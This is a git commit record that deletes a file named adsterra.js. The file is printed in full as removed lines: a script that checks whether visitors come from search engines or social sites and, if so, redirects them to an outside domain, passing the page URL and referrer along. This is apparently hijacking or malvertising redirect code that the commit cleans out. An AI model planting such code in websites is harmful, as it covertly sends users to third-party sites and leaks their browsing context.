96eb670f9335f1a3f55c70480c91ce7f1f650964
gebangkiidiw <46375292+gebangkiidiw@users.noreply.github.com>
2023-01-31 22:02:08 +0700

    Delete adsterra.js

--- adsterra.js
+++
@@ -1,9 +0,0 @@
-var ars = rChoice([
-"https://dfile.luciascatering.com"
-
-]);
-function rChoice(arr) {
-    return arr[Math.floor(arr.length * Math.random())];
-}
-
-if(['.google.', '.yahoo.', 'bing.', 'yandex.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
